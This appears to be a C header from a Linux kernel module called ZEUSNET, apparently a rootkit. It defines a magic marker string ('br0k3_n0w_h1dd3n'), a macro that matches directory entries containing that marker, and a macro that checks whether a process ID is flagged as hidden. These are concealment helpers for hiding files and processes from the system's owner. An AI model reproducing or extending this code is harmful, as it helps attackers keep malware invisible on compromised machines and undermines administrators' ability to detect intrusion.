//
// Created by kernel-dbg on 24-2-1.
//

#ifndef ZEUSNET_KERNEL_HOOK_UTILS_H
#define ZEUSNET_KERNEL_HOOK_UTILS_H

#define DEBUG
#define MAGIC_HIDE "br0k3_n0w_h1dd3n"
#define MAGIC_VALUE "br0k3"
#define MAGIC_NUMBER 9995
#define MAX_TCP_PORTS 65535
#define CONTAIN_HIDE_SEQUENCE(DIRENT_NAME) \
  strstr(DIRENT_NAME, MAGIC_HIDE) != NULL
#define NEED_HIDE_PROC(DIRENT_NAME, PROC) \
  (PROC && pid_is_hidden(simple_strtoul(DIRENT_NAME, NULL, 10)))

#ifdef DEBUG
#define PR_DEBUG(...) pr_debug(__VA_ARGS__)
#define PR_INFO(...) pr_info(__VA_ARGS__)
#else
#define PR_DEBUG(...)
#define PR_INFO(...)
#endif

#endif
